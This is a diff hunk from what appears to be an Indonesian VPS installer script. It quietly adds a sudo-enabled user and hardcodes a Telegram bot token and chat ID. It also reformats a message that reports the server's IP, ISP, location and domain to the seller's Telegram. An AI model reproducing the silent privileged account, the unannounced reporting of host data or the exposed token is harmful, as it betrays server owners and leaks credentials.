@@ -172,24 +172,23 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="-1002029496202"  # ID grup Telegram Anda
-KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # Token bot Anda
-TIME="10"  # Timeout maksimal untuk curl
+CHATID="-1002029496202"  # ID grup Telegram Anda
+KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"  # Token bot Anda
+TIME="10"  # Timeout maksimal untuk curl
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="SCRIPT PREMIUM RISWAN STORE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
+TEXT="<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+<b>🔥SCRIPT PREMIUM RISWAN STORE🔥</b>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
 <code>Pengguna :</code> <code>$Name</code>
-<code>Domain   :</code> <code>$domain</code>
-<code>IP VPS   :</code> <code>$MYIP</code>
-<code>ISP      :</code> <code>$ISP</code>
-<code>Waktu    :</code> <code>$TIMEZONE</code>
-<code>Lokasi   :</code> <code>$CITY</code>
-<code>Expired  :</code> <code>$Exp</code>
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Dikelola oleh Admin @RiswanJabar
-━━━━━━━━━━━━━━━━━━━━━━━━━━━
-<i>Notifikasi Otomatis Dari Github</i>"
-
+<code>Domain   :</code> <code>$domain</code>
+<code>IP VPS   :</code> <code>$MYIP</code>
+<code>ISP      :</code> <code>$ISP</code>
+<code>Waktu    :</code> <code>$TIMEZONE</code>
+<code>Lokasi   :</code> <code>$CITY</code>
+<code>Expired  :</code> <code>$Exp</code>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>
+     <b>🔥Notifikasi Otomatis Dari Github🔥</b>
+<b>━━━━━━━━━━━━━━━━━━━━━━━━━━━</b>"
 # Format tombol inline keyboard untuk kontak
 reply_markup='{"inline_keyboard":[[{"text":"Telegram","url":"https://t.me/RiswanJabar"},{"text":"Contact","url":"https://wa.me/6285888801241"}]]}'
 
